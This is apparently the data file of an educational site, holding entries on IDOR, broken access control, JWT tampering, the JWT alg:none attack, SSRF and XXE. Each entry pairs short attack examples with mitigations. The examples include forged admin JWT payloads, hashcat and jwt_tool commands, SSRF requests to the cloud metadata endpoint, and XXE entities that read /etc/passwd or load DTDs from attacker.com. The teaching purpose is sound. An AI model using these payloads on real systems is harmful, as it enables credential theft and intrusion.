allVulnerabilities.push(
{
    "id": 22,
    "title": "Insecure Direct Object Reference (IDOR)",
    "summary": `
        <p><b>Insecure Direct Object Reference (IDOR)</b> is a critical access control vulnerability that occurs when applications expose internal object references without properly verifying user authorization.</p>

        <p>This vulnerability allows attackers to access, modify, or delete resources belonging to other users by manipulating identifiers such as user IDs, file names, order numbers, or database records.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application trusts user-supplied object identifiers without validating ownership or permissions.</p>

        <h3>Common Direct Object References:</h3>

        <pre><code>User IDs

Order numbers

File names

Invoice IDs

Document identifiers</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>http://target.com/profile?id=1001</code></pre>

        <p>The application displays profile information based only on the provided user ID.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/profile?id=1002</code></pre>

        <p>The attacker changes the identifier to access another user's profile.</p>

        <h3>Why is IDOR Dangerous?</h3>

        <p>Successful exploitation may allow attackers to access sensitive data, modify resources, delete information, or perform unauthorized actions on behalf of other users.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Accessing other user accounts.</p>
        <p>2. Viewing confidential documents.</p>
        <p>3. Modifying sensitive records.</p>
        <p>4. Deleting resources.</p>
        <p>5. Privilege escalation.</p>

        <h3>Example of Vulnerable Backend Logic:</h3>

        <pre><code>// Vulnerable Example

$user = database.getUser($_GET['id']);

return $user;</code></pre>

        <p>The application fetches data directly without checking authorization.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /account?id=1002 HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>User profiles

Download systems

Invoice portals

API endpoints

Administrative dashboards</code></pre>

        <h3>IDOR in APIs:</h3>

        <pre><code>GET /api/users/1001</code></pre>

        <p>Attackers may modify API object identifiers to access unauthorized resources.</p>

        <h3>File Access IDOR Example:</h3>

        <pre><code>http://target.com/download?file=invoice1001.pdf</code></pre>

        <p>Changing the filename may expose documents belonging to other users.</p>

        <h3>Mass Enumeration Example:</h3>

        <pre><code>id=1001
id=1002
id=1003</code></pre>

        <p>Attackers automate enumeration to collect large amounts of sensitive data.</p>

        <h3>Indicators of IDOR Vulnerabilities:</h3>

        <p>1. Sequential numeric identifiers.</p>
        <p>2. Missing authorization checks.</p>
        <p>3. Predictable object references.</p>
        <p>4. Sensitive data exposed through URLs or APIs.</p>
        <p>5. Access control logic only enforced on the client side.</p>

        <h3>Horizontal Privilege Escalation:</h3>

        <p>Attackers access resources belonging to users with the same privilege level.</p>

        <h3>Vertical Privilege Escalation:</h3>

        <p>Attackers access administrative or higher-privileged resources.</p>

        <h3>Weak Authorization Example:</h3>

        <pre><code>if(user.isLoggedIn()) {
    return requestedData;
}</code></pre>

        <p>The application checks authentication only and ignores ownership validation.</p>

        <h3>Safe Authorization Example:</h3>

        <pre><code>// Secure Example

if(user.id == requestedObject.ownerId) {
    return requestedObject;
}</code></pre>

        <p>The application verifies resource ownership before granting access.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Enforce server-side authorization checks.</b></p>

        <p><b>2. Validate resource ownership for every request.</b></p>

        <p><b>3. Avoid exposing predictable identifiers.</b></p>

        <p><b>4. Use indirect object references or UUIDs.</b></p>

        <p><b>5. Apply least privilege access controls.</b></p>

        <p><b>6. Validate permissions on APIs and backend systems.</b></p>

        <p><b>7. Monitor suspicious enumeration activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Apply Role-Based Access Control (RBAC)

Monitor access logs

Restrict administrative endpoints

Enable anomaly detection

Apply API authorization controls</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Postman
Nuclei
Autorize Extension</code></pre>

        <h3>Difference Between Authentication and Authorization:</h3>

        <p><b>Authentication:</b> Verifies user identity.</p>

        <p><b>Authorization:</b> Determines what resources the user may access.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may expose confidential records, compromise customer accounts, access financial documents, modify sensitive data, or gain administrative capabilities.</p>

        <h3>Vulnerability Severity:</h3>

        <p>IDOR vulnerabilities are considered highly critical because missing authorization checks may directly expose sensitive user and administrative resources to unauthorized attackers.</p>
    `
},


{
    "id": 23,
    "title": "Broken Access Control",
    "summary": `
        <p><b>Broken Access Control</b> is a critical security vulnerability that occurs when applications fail to properly enforce restrictions on what authenticated or unauthenticated users are allowed to access.</p>

        <p>This vulnerability allows attackers to bypass authorization mechanisms and perform actions or access resources that should normally be restricted.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application does not correctly validate user permissions before granting access to sensitive functionality or data.</p>

        <h3>Common Access Control Weaknesses:</h3>

        <pre><code>Missing authorization checks

Client-side access control

Predictable resource identifiers

Privilege escalation flaws

Insecure API permissions</code></pre>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>http://target.com/admin</code></pre>

        <p>A normal user accesses an administrative page without proper permission validation.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/admin/delete-user?id=1001</code></pre>

        <p>The attacker performs administrative actions without having administrative privileges.</p>

        <h3>Why is Broken Access Control Dangerous?</h3>

        <p>Successful exploitation may allow attackers to access sensitive data, modify critical resources, escalate privileges, or fully compromise the application.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Accessing restricted pages.</p>
        <p>2. Viewing confidential information.</p>
        <p>3. Modifying sensitive records.</p>
        <p>4. Deleting resources.</p>
        <p>5. Gaining administrative privileges.</p>

        <h3>Horizontal Privilege Escalation:</h3>

        <p>Attackers access resources belonging to users with the same privilege level.</p>

        <pre><code>http://target.com/account?id=1002</code></pre>

        <h3>Vertical Privilege Escalation:</h3>

        <p>Attackers gain access to higher-privileged administrative functionality.</p>

        <pre><code>http://target.com/admin/panel</code></pre>

        <h3>Client-Side Access Control Example:</h3>

        <pre><code>if(userRole == "admin") {
    showAdminButton();
}</code></pre>

        <p>The application relies only on client-side checks, which attackers can bypass.</p>

        <h3>Insecure API Access Example:</h3>

        <pre><code>GET /api/admin/users</code></pre>

        <p>The API endpoint lacks proper authorization validation.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /admin HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>Forced Browsing Attack:</h3>

        <p>Attackers manually request hidden or restricted URLs.</p>

        <pre><code>/admin
/dashboard
/internal
/config</code></pre>

        <h3>Indicators of Broken Access Control:</h3>

        <p>1. Sensitive pages accessible without authorization.</p>
        <p>2. Missing permission checks on APIs.</p>
        <p>3. Role validation only enforced on the client side.</p>
        <p>4. Predictable administrative URLs.</p>
        <p>5. Unauthorized actions succeed.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Administrative panels

User management systems

APIs

File download systems

Payment systems</code></pre>

        <h3>Weak Authorization Example:</h3>

        <pre><code>if(user.isLoggedIn()) {
    allowAccess();
}</code></pre>

        <p>The application verifies authentication only and ignores authorization levels.</p>

        <h3>Safe Authorization Example:</h3>

        <pre><code>// Secure Example

if(user.role == "admin") {
    allowAccess();
}</code></pre>

        <p>The application validates user roles before granting access.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Enforce server-side authorization checks.</b></p>

        <p><b>2. Apply Role-Based Access Control (RBAC).</b></p>

        <p><b>3. Validate permissions for every request.</b></p>

        <p><b>4. Deny access by default.</b></p>

        <p><b>5. Avoid relying on client-side authorization.</b></p>

        <p><b>6. Protect API endpoints properly.</b></p>

        <p><b>7. Monitor suspicious privilege escalation attempts.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict administrative interfaces

Enable access logging

Apply least privilege permissions

Monitor API authorization failures

Use Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Postman
Autorize Extension
Nuclei</code></pre>

        <h3>Difference Between IDOR and Broken Access Control:</h3>

        <p><b>IDOR:</b> Focuses on direct object reference manipulation.</p>

        <p><b>Broken Access Control:</b> Covers broader authorization failures across the application.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may gain unauthorized administrative access, expose sensitive records, modify application data, compromise user accounts, or completely take over critical systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Broken Access Control is considered extremely critical because authorization failures may directly expose sensitive functionality and administrative privileges to attackers.</p>
    `
},


{
    "id": 24,
    "title": "JWT Token Manipulation",
    "summary": `
        <p><b>JWT Token Manipulation</b> is a critical security vulnerability that occurs when applications improperly validate or securely implement JSON Web Tokens (JWTs), allowing attackers to modify, forge, or abuse authentication tokens.</p>

        <p>JWTs are commonly used for authentication and authorization in modern web applications and APIs. Weak JWT implementations may allow attackers to bypass authentication, escalate privileges, or impersonate other users.</p>

        <h3>What is a JWT?</h3>

        <p>JWT stands for <b>JSON Web Token</b>, which is a token format used to securely transfer authentication and authorization data between systems.</p>

        <h3>JWT Structure:</h3>

        <pre><code>HEADER.PAYLOAD.SIGNATURE</code></pre>

        <h3>Example JWT:</h3>

        <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.
signature</code></pre>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application fails to properly validate JWT signatures, algorithms, expiration times, or token integrity.</p>

        <h3>Common JWT Weaknesses:</h3>

        <pre><code>Weak signing secrets

Missing signature verification

Algorithm confusion

Accepting unsigned tokens

Exposed sensitive payload data</code></pre>

        <h3>JWT Payload Manipulation:</h3>

        <pre><code>{
  "user":"admin",
  "role":"admin"
}</code></pre>

        <p>Attackers modify the payload to escalate privileges.</p>

        <h3>Algorithm Confusion Attack:</h3>

        <pre><code>{
  "alg":"none"
}</code></pre>

        <p>Some vulnerable applications incorrectly accept unsigned tokens.</p>

        <h3>Unsigned JWT Example:</h3>

        <pre><code>HEADER.PAYLOAD.</code></pre>

        <p>If the server accepts tokens without validating signatures, attackers may forge arbitrary tokens.</p>

        <h3>Weak Secret Key Example:</h3>

        <pre><code>secret
password123
jwtsecret</code></pre>

        <p>Weak signing secrets may be cracked using brute force attacks.</p>

        <h3>Why is JWT Manipulation Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass authentication, impersonate users, gain administrative access, or fully compromise APIs and applications.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>Authorization: Bearer eyJhbGciOi...</code></pre>

        <p>Attackers intercept and modify JWT tokens during requests.</p>

        <h3>JWT Privilege Escalation Example:</h3>

        <pre><code>{
  "username":"user",
  "role":"admin"
}</code></pre>

        <p>The attacker changes the role value to obtain administrative privileges.</p>

        <h3>Expired Token Validation Failure:</h3>

        <p>Some applications fail to verify token expiration timestamps.</p>

        <pre><code>"exp": 9999999999</code></pre>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Account impersonation.</p>
        <p>4. Administrative access.</p>
        <p>5. API compromise.</p>

        <h3>Indicators of JWT Vulnerabilities:</h3>

        <p>1. JWTs accepted without valid signatures.</p>
        <p>2. Weak or guessable signing secrets.</p>
        <p>3. Sensitive data exposed inside payloads.</p>
        <p>4. Missing expiration validation.</p>
        <p>5. Algorithm confusion vulnerabilities.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>REST APIs

Authentication systems

Single Sign-On (SSO)

Mobile applications

Cloud services</code></pre>

        <h3>JWT Brute Force Example:</h3>

        <pre><code>hashcat -m 16500 jwt.txt wordlist.txt</code></pre>

        <p>Attackers attempt to crack weak JWT signing secrets.</p>

        <h3>Safe JWT Example:</h3>

        <pre><code>// Secure JWT Controls

Use strong secrets

Validate signatures

Verify expiration

Restrict algorithms</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use strong random signing secrets.</b></p>

        <p><b>2. Always validate JWT signatures.</b></p>

        <p><b>3. Reject unsigned tokens.</b></p>

        <p><b>4. Restrict allowed algorithms.</b></p>

        <p><b>5. Validate token expiration and claims.</b></p>

        <p><b>6. Avoid storing sensitive data inside JWT payloads.</b></p>

        <p><b>7. Rotate secrets periodically.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Monitor suspicious token usage

Restrict API permissions

Apply secure key management

Use HTTPS for token transmission

Enable security logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
jwt_tool
Hashcat
OWASP ZAP
Nuclei</code></pre>

        <h3>Difference Between Session Cookies and JWTs:</h3>

        <p><b>Session Cookies:</b> Session data is stored on the server.</p>

        <p><b>JWTs:</b> Authentication data is stored inside signed tokens on the client side.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication systems, gain unauthorized administrative access, compromise APIs, impersonate users, or access sensitive cloud services.</p>

        <h3>Vulnerability Severity:</h3>

        <p>JWT Token Manipulation vulnerabilities are considered extremely critical because weak JWT validation may completely break authentication and authorization mechanisms.</p>
    `
},


{
    "id": 25,
    "title": "JWT None Algorithm Exploit",
    "summary": `
        <p><b>JWT None Algorithm Exploit</b> is a critical authentication vulnerability that occurs when applications incorrectly accept JSON Web Tokens (JWTs) using the <code>alg:none</code> algorithm without verifying a valid signature.</p>

        <p>This vulnerability allows attackers to forge arbitrary JWT tokens and bypass authentication or authorization mechanisms completely.</p>

        <h3>What is the None Algorithm?</h3>

        <p>JWT supports multiple signing algorithms used to verify token integrity.</p>

        <pre><code>HS256
RS256
ES256
none</code></pre>

        <p>The <code>none</code> algorithm indicates that the token is unsigned and should normally never be accepted in production environments.</p>

        <h3>JWT Structure:</h3>

        <pre><code>HEADER.PAYLOAD.SIGNATURE</code></pre>

        <h3>Normal Secure JWT Example:</h3>

        <pre><code>{
  "alg":"HS256",
  "typ":"JWT"
}</code></pre>

        <h3>Vulnerable JWT Header Example:</h3>

        <pre><code>{
  "alg":"none",
  "typ":"JWT"
}</code></pre>

        <p>The attacker changes the algorithm from a secure signing method to <code>none</code>.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the server trusts the JWT header and skips signature verification if the algorithm is set to <code>none</code>.</p>

        <h3>Unsigned JWT Example:</h3>

        <pre><code>HEADER.PAYLOAD.</code></pre>

        <p>The token does not contain a valid signature.</p>

        <h3>Privilege Escalation Example:</h3>

        <pre><code>{
  "username":"admin",
  "role":"admin"
}</code></pre>

        <p>The attacker forges a JWT payload containing administrative privileges.</p>

        <h3>Basic Exploitation Process:</h3>

        <p>1. Intercept a valid JWT token.</p>
        <p>2. Decode the token.</p>
        <p>3. Change the algorithm to <code>none</code>.</p>
        <p>4. Modify the payload.</p>
        <p>5. Remove the signature.</p>
        <p>6. Send the forged token to the server.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>Authorization: Bearer eyJhbGciOiJub25lIn0...</code></pre>

        <p>The attacker sends a forged unsigned token.</p>

        <h3>Why is the Vulnerability Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass authentication, impersonate users, gain administrative access, or fully compromise APIs and web applications.</p>

        <h3>Indicators of Vulnerability:</h3>

        <p>1. Server accepts unsigned JWTs.</p>
        <p>2. Missing JWT signature validation.</p>
        <p>3. The application trusts user-controlled JWT headers.</p>
        <p>4. Authentication succeeds with modified tokens.</p>
        <p>5. JWT libraries improperly configured.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Administrative access.</p>
        <p>4. API compromise.</p>
        <p>5. Account impersonation.</p>

        <h3>Common Vulnerable Systems:</h3>

        <pre><code>REST APIs

Authentication gateways

Single Sign-On systems

Cloud services

Mobile application backends</code></pre>

        <h3>Manual JWT Modification Example:</h3>

        <pre><code>{
  "user":"victim",
  "role":"admin"
}</code></pre>

        <p>The attacker changes authorization data inside the JWT payload.</p>

        <h3>Testing Using jwt_tool:</h3>

        <pre><code>python3 jwt_tool.py TOKEN -X n</code></pre>

        <p>The tool attempts exploitation using the none algorithm technique.</p>

        <h3>Safe JWT Validation Example:</h3>

        <pre><code>// Secure JWT Validation

Reject alg:none

Verify signatures

Restrict accepted algorithms

Validate token claims</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Completely disable the none algorithm.</b></p>

        <p><b>2. Always validate JWT signatures.</b></p>

        <p><b>3. Restrict accepted algorithms explicitly.</b></p>

        <p><b>4. Use trusted JWT libraries.</b></p>

        <p><b>5. Never trust user-controlled JWT headers.</b></p>

        <p><b>6. Validate token claims and expiration.</b></p>

        <p><b>7. Regularly update JWT libraries.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Apply strict JWT validation

Use strong secret keys

Enable API security monitoring

Apply access logging

Use HTTPS for token transmission</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
jwt_tool
OWASP ZAP
Nuclei
Postman</code></pre>

        <h3>Difference Between JWT Manipulation and None Algorithm Exploit:</h3>

        <p><b>JWT Manipulation:</b> Includes multiple JWT-related weaknesses.</p>

        <p><b>None Algorithm Exploit:</b> Specifically abuses acceptance of unsigned JWT tokens.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication entirely, impersonate administrators, access sensitive APIs, compromise cloud services, or fully take over vulnerable applications.</p>

        <h3>Vulnerability Severity:</h3>

        <p>JWT None Algorithm vulnerabilities are considered extremely critical because improper signature validation may completely break authentication security.</p>
    `
},


{
    "id": 26,
    "title": "Server Side Request Forgery (SSRF)",
    "summary": `
        <p><b>Server Side Request Forgery (SSRF)</b> is a critical web vulnerability that allows attackers to force a server to send unauthorized requests to internal or external systems.</p>

        <p>This vulnerability occurs when a web application fetches remote resources based on user-controlled input without proper validation or restrictions.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the server accepts URLs or network locations from users and performs requests on their behalf.</p>

        <h3>Simple Vulnerable Example:</h3>

        <pre><code>http://target.com/fetch?url=http://example.com</code></pre>

        <p>The application fetches the supplied URL without validating its destination.</p>

        <h3>Basic Exploitation Example:</h3>

        <pre><code>http://target.com/fetch?url=http://127.0.0.1/admin</code></pre>

        <p>The attacker forces the server to access internal services that are normally inaccessible externally.</p>

        <h3>Why is SSRF Dangerous?</h3>

        <p>Successful exploitation may allow attackers to access internal systems, cloud metadata services, private APIs, administrative panels, or sensitive network resources.</p>

        <h3>Common SSRF Targets:</h3>

        <pre><code>127.0.0.1

localhost

Internal APIs

Cloud metadata services

Private network services</code></pre>

        <h3>Accessing Local Services Example:</h3>

        <pre><code>http://127.0.0.1:8080</code></pre>

        <p>The attacker attempts to interact with services running on the local server.</p>

        <h3>Cloud Metadata SSRF Example:</h3>

        <pre><code>http://169.254.169.254/latest/meta-data/</code></pre>

        <p>Attackers target cloud metadata endpoints to steal credentials or tokens.</p>

        <h3>SSRF Against Internal APIs:</h3>

        <pre><code>http://internal-api/admin/users</code></pre>

        <p>The server accesses internal APIs that are hidden from external users.</p>

        <h3>Blind SSRF:</h3>

        <p>Sometimes the attacker cannot directly view the server response.</p>

        <pre><code>http://attacker.com/log</code></pre>

        <p>The attacker monitors external interactions to confirm exploitation.</p>

        <h3>Out-of-Band SSRF:</h3>

        <p>The vulnerable server sends requests to attacker-controlled infrastructure.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Image fetchers

Webhook integrations

PDF generators

URL preview systems

Import functionality</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>GET /fetch?url=http://127.0.0.1 HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>SSRF Port Scanning Example:</h3>

        <pre><code>http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379</code></pre>

        <p>Attackers probe internal ports and services through the vulnerable server.</p>

        <h3>Bypassing SSRF Filters:</h3>

        <pre><code>127.0.0.1
localhost
0.0.0.0
2130706433</code></pre>

        <p>Attackers may use alternative IP representations to bypass weak filters.</p>

        <h3>URL Redirection Abuse:</h3>

        <p>Attackers may abuse open redirects to bypass URL validation mechanisms.</p>

        <h3>Indicators of SSRF Vulnerabilities:</h3>

        <p>1. User-controlled URL fetching.</p>
        <p>2. Internal network interactions.</p>
        <p>3. Server-side HTTP requests.</p>
        <p>4. External callbacks from the server.</p>
        <p>5. Weak URL validation logic.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Accessing internal services.</p>
        <p>2. Cloud credential theft.</p>
        <p>3. Internal network scanning.</p>
        <p>4. Administrative access.</p>
        <p>5. Remote Code Execution in chained attacks.</p>

        <h3>Example of Vulnerable Backend Logic:</h3>

        <pre><code>// Vulnerable Example

url = request.GET['url']

response = requests.get(url)</code></pre>

        <p>The application performs requests directly using user-controlled URLs.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Allow only trusted domains

Block internal IP ranges

Validate URLs strictly</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Restrict outgoing server requests.</b></p>

        <p><b>2. Allow only trusted domains.</b></p>

        <p><b>3. Block internal IP addresses and localhost.</b></p>

        <p><b>4. Disable unnecessary network access.</b></p>

        <p><b>5. Validate and sanitize user-supplied URLs.</b></p>

        <p><b>6. Apply network segmentation.</b></p>

        <p><b>7. Monitor unusual outbound traffic.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict cloud metadata access

Apply firewall rules

Use DNS filtering

Monitor outbound connections

Disable unused services</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
SSRFmap
Nuclei
Interactsh</code></pre>

        <h3>Difference Between SSRF and XXE:</h3>

        <p><b>SSRF:</b> Forces the server to send arbitrary requests.</p>

        <p><b>XXE:</b> Exploits XML parsers to access files or internal resources.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may compromise cloud environments, access internal administrative systems, steal credentials, scan private networks, or chain SSRF with other vulnerabilities to achieve Remote Code Execution.</p>

        <h3>Vulnerability Severity:</h3>

        <p>SSRF vulnerabilities are considered extremely critical because vulnerable servers may become gateways into otherwise inaccessible internal infrastructure.</p>
    `
},


{
    "id": 27,
    "title": "XML External Entity (XXE)",
    "summary": `
        <p><b>XML External Entity (XXE)</b> is a critical vulnerability that occurs when an application processes untrusted XML input with insecure XML parsers that allow external entity processing.</p>

        <p>This vulnerability allows attackers to read local files, access internal services, perform Server Side Request Forgery (SSRF), cause Denial of Service (DoS), or potentially achieve Remote Code Execution in chained attacks.</p>

        <h3>What is XML?</h3>

        <p>XML stands for <b>eXtensible Markup Language</b>, which is commonly used for data exchange between systems and applications.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when XML parsers allow external entities or external DTD processing without proper restrictions.</p>

        <h3>Basic XML Example:</h3>

        <pre><code>&lt;user&gt;
    &lt;name&gt;admin&lt;/name&gt;
&lt;/user&gt;</code></pre>

        <h3>What are XML Entities?</h3>

        <p>Entities are variables used inside XML documents.</p>

        <pre><code>&lt;!ENTITY company "Example"&gt;</code></pre>

        <h3>Dangerous External Entity Example:</h3>

        <pre><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></pre>

        <p>The parser attempts to read a local file from the server.</p>

        <h3>Basic XXE Exploitation Example:</h3>

        <pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;

&lt;user&gt;
    &lt;name&gt;&xxe;&lt;/name&gt;
&lt;/user&gt;</code></pre>

        <p>The XML parser replaces the entity with the contents of the targeted file.</p>

        <h3>Why is XXE Dangerous?</h3>

        <p>Successful exploitation may allow attackers to read sensitive files, access internal systems, perform SSRF attacks, or compromise backend infrastructure.</p>

        <h3>Common Sensitive File Targets:</h3>

        <pre><code>/etc/passwd

/etc/shadow

C:\\Windows\\win.ini

Application configuration files</code></pre>

        <h3>XXE SSRF Example:</h3>

        <pre><code>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:8080"&gt;</code></pre>

        <p>The server performs requests to internal services through the XML parser.</p>

        <h3>Blind XXE:</h3>

        <p>Sometimes attackers cannot directly view the server response.</p>

        <pre><code>&lt;!ENTITY xxe SYSTEM "http://attacker.com/log"&gt;</code></pre>

        <p>The attacker monitors external callbacks to confirm exploitation.</p>

        <h3>Out-of-Band XXE Example:</h3>

        <pre><code>&lt;!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd"&gt;</code></pre>

        <p>The parser loads attacker-controlled external DTD files.</p>

        <h3>Billion Laughs DoS Attack:</h3>

        <pre><code>&lt;!ENTITY a "LOL"&gt;
&lt;!ENTITY b "&a;&a;&a;&a;&a;"&gt;</code></pre>

        <p>Nested entity expansion may exhaust server memory and resources.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>SOAP APIs

XML file uploads

Document parsers

SSO systems

Web services</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /api/xml HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/xml</code></pre>

        <h3>Indicators of XXE Vulnerabilities:</h3>

        <p>1. XML input accepted by the application.</p>
        <p>2. XML parsers with external entity support enabled.</p>
        <p>3. File disclosure through XML entities.</p>
        <p>4. Server-side requests triggered by XML input.</p>
        <p>5. Outbound DNS or HTTP callbacks.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Reading sensitive files.</p>
        <p>2. SSRF attacks.</p>
        <p>3. Internal network access.</p>
        <p>4. Credential theft.</p>
        <p>5. Denial of Service.</p>

        <h3>Example of Vulnerable Backend Logic:</h3>

        <pre><code>// Vulnerable XML Parser

DocumentBuilderFactory factory =
DocumentBuilderFactory.newInstance();

factory.setExpandEntityReferences(true);</code></pre>

        <p>The parser allows external entity processing.</p>

        <h3>Safe XML Parser Example:</h3>

        <pre><code>// Secure Configuration

Disable DTD processing

Disable external entities

Use secure parser settings</code></pre>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Disable external entity processing.</b></p>

        <p><b>2. Disable DTD support when unnecessary.</b></p>

        <p><b>3. Use secure XML parser configurations.</b></p>

        <p><b>4. Validate and sanitize XML input.</b></p>

        <p><b>5. Restrict server outbound network access.</b></p>

        <p><b>6. Apply least privilege permissions.</b></p>

        <p><b>7. Monitor suspicious XML parsing activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict file system access

Apply network segmentation

Disable unnecessary XML services

Monitor outbound traffic

Use Web Application Firewall (WAF)</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
XXEinjector
Nuclei
Metasploit</code></pre>

        <h3>Difference Between XXE and SSRF:</h3>

        <p><b>XXE:</b> Exploits insecure XML parsers.</p>

        <p><b>SSRF:</b> Exploits arbitrary server-side request functionality.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may steal sensitive files, compromise cloud services, access internal networks, expose credentials, disrupt services, or combine XXE with other vulnerabilities to achieve full system compromise.</p>

        <h3>Vulnerability Severity:</h3>

        <p>XXE vulnerabilities are considered extremely critical because insecure XML processing may expose sensitive systems, internal networks, and confidential server data.</p>
    `
},


);
